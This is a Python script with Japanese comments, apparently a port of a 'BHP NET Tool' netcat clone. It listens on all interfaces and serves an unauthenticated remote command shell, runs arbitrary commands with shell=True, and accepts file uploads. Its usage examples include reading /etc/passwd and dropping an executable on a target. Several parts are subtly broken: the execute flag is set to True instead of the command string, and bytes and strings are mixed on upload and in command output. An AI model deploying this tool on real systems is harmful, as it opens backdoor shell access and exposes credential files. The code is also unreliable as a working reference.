#!/usr/bin/python3
# -*- coding:utf-8 -*-

import sys
import socket as s
import getopt
import threading
import subprocess


listen                = False
command               = False
upload                = False
execute               = ""
target                = ""
upload_destination    = ""
port                  = 0


def usage():
    print("BHP NET Tool")
    print()
    print("Usage: bjpnet.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for")
    print("                           incoming connections")
    print("-e --execute=file_to_run - execute the given file upon")
    print("                           receiving a connection")
    print("-c --command             - initialize a command shell")
    print("-u --upload=destination  - upon receiving connection upload a")
    print("                           file and write to [destination]")
    print()
    print()
    print("Example: ")
    print("bhnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe")
    print("bhnet.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.11.12 -p 135")
    
    sys.exit(0)

    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target


    if not len(sys.argv[1:]):
        usage()
    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            "hle:t:p:cu",
            ["help", "listen", "execute=", "target=",
             "port=", "command", "upload="])

    except getopt.GetoptError as err:
        print(str(err))
        usage()


    #コマンドラインオプションの読み込み
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l" , "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = True
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t" , "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
           assert False, "Unhandled Option"

    #接続を待機する？　それとも標準入力からデータを受け取り送信する
    if not listen and len(target) and port > 0:

        #コマンドラインからの入力をbufferに格納する
        #入力がないと処理が継続されないので
        #標準入力にデータを送らない場合はctrl-D
        buffer = sys.stdin.read()

        #send data
        client_sender(buffer)

    #接続待機
    #コマンドラインオプションに応じてファイルアップロード
    #コマンド実行
    if listen:
        server_loop()


def client_sender(buffer):
    #buffer をbytes に変換して送る
    buffer = buffer.encode()
    client = s.socket(s.AF_INET, s.SOCK_STREAM)
    
    try:
        #connect to target host
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)

        while True:
            
            #ホストからのデータを待機
            recv_len = 1

            #bytes 文字作成

            response = b""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
                
            #bytes to str に変換python3
            response = response.decode()
            sys.stdout.write(response)

            #追加の入力を待機
            buffer = input("")
            buffer += "\n"
    
            #bytes に変換して送るpython3

            buffer = buffer.encode()
            #データの送信
            client.send(buffer)

    except:
        print("[*] Exception! Existing.")
        #接続の終了
        client.close()
        
def server_loop():
    global target

    #待機するIPアドレスが指定されていない場合は
    #すべてのインターフェースで接続待機
    if not len(target):
        target = "0.0.0.0"
        
    server = s.socket(s.AF_INET, s.SOCK_STREAM)

    server.bind((target,port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        #クライアントからの新しい接続を処理するスレッドの起動
        client_thread = threading.Thread(
            target = client_handler, args = (client_socket, ))
        client_thread.start()

def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(
            command, stderr= subprocess.STDOUT, shell= True)
    except:
        output = "Fail to execute command.\n"

    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        #ファイルアップロードを指定されているかの確認
        file_buffer = b""

        #受信データがなくなるまでデータ受信を継続
        while True:
            data = client_socket.recv(1024)
            #data をbinaryから変換
            #data = data.decode()

            if len(data) == 0:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination,"w")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send(
                "Successfully saved file to {!s}\r\n".format(upload_destination).encode())

        except:
            client_socket.send(
                "Fail to save file to {!s}\r\n".format(upload_destination).encode())
            
    if len(execute):
        output = run_command(execute)
        output = output.encode()
        client_socket.send(output)

    if command:
        prompt = b"<pync:#> "
        client_socket.send(prompt)

        while True:
            cmd_buffer = b""
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            ##bytes からstrにへんかん
            #cmd_buffer = cmd_buffer.decode()
            
            response = run_command(cmd_buffer)
            response += prompt

            client_socket.send(response)

if __name__ == '__main__':
    main()

    
    
    
    
    
            
             



    
    
        
    
        
            
    
